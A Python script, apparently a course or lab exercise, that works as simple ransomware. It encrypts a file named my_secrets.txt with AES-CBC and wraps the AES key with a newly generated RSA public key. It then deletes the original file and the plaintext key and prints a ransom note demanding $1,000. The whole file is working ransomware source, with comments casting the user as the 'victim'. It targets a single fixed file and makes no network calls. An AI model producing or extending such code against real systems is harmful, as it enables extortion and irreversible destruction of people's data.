import os
import subprocess
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import base64

def generate_symmetric_key():
    """Generate 128-bit key using OpenSSL and return as base64 string"""
    try:
        result = subprocess.run(['openssl', 'rand', '-base64', '16'], 
                              capture_output=True, text=True, check=True)
        key = result.stdout.strip()
        
        # Save to key.txt
        with open('key.txt', 'w') as f:
            f.write(key)
        
        return key
    except subprocess.CalledProcessError as e:
        print(f"Error generating symmetric key: {e}")
        raise

def generate_key_pair():
    """Generate RSA key pair and return public key"""
    try:
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        
        public_key = private_key.public_key()
        
        # Serialize and save public key only (private key wouldn't be left on victim's machine)
        with open('public_key.pem', 'wb') as f:
            f.write(public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            ))
        
        return public_key
    except Exception as e:
        print(f"Error generating key pair: {e}")
        raise

def encrypt_file(filename, key_b64):
    """Encrypt file using AES-CBC with the provided base64 encoded key"""
    try:
        # Read file content
        with open(filename, 'rb') as f:
            data = f.read()
        
        # Decode base64 key
        key = base64.b64decode(key_b64)
        
        # Generate IV
        iv = os.urandom(16)
        
        # Encrypt using AES-CBC
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        
        # Pad data to be multiple of block size (PKCS7 padding)
        pad_len = 16 - (len(data) % 16)
        padded_data = data + bytes([pad_len] * pad_len)
        
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        
        # Save IV + ciphertext as base64
        encrypted_data = base64.b64encode(iv + ciphertext).decode('utf-8')
        with open('data_cipher.txt', 'w') as f:
            f.write(encrypted_data)
        
        return encrypted_data
    except Exception as e:
        print(f"Error encrypting file: {e}")
        raise

def encrypt_key_with_public_key(key_b64, public_key):
    """Encrypt symmetric key with RSA public key"""
    try:
        # Decode base64 key first
        key = base64.b64decode(key_b64)
        
        # Encrypt symmetric key with RSA public key
        encrypted_key = public_key.encrypt(
            key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        # Save as base64
        encrypted_key_b64 = base64.b64encode(encrypted_key).decode('utf-8')
        with open('key_cipher.txt', 'w') as f:
            f.write(encrypted_key_b64)
        
        return encrypted_key_b64
    except Exception as e:
        print(f"Error encrypting key: {e}")
        raise

def main():
    try:
        # Step 1: Generate symmetric key
        print("Generating symmetric key...")
        symmetric_key = generate_symmetric_key()
        
        # Step 2: Generate attacker's public key
        print("Generating RSA key pair...")
        public_key = generate_key_pair()
        
        # Step 3: Encrypt victim's file
        print("Encrypting victim's file...")
        if os.path.exists('my_secrets.txt'):
            encrypt_file('my_secrets.txt', symmetric_key)
        else:
            raise FileNotFoundError("my_secrets.txt not found")
        
        # Step 4: Encrypt symmetric key with public key
        print("Encrypting symmetric key...")
        encrypt_key_with_public_key(symmetric_key, public_key)
        
        # Step 5: Delete key.txt
        print("Cleaning up...")
        if os.path.exists('key.txt'):
            os.remove('key.txt')
        
        # Step 6: Delete original file
        if os.path.exists('my_secrets.txt'):
            os.remove('my_secrets.txt')
        
        # Step 7: Display ransom message
        print("\n=== RANSOM NOTE ===")
        print("Your file my_secrets.txt is encrypted. To decrypt it, you need to pay me $1,000")
        print("and send key_cipher.txt to me.\n")
        
    except Exception as e:
        print(f"Ransomware failed: {e}")
        # Clean up partially created files
        for f in ['key.txt', 'data_cipher.txt', 'key_cipher.txt', 'public_key.pem']:
            if os.path.exists(f):
                os.remove(f)

if __name__ == "__main__":
    main()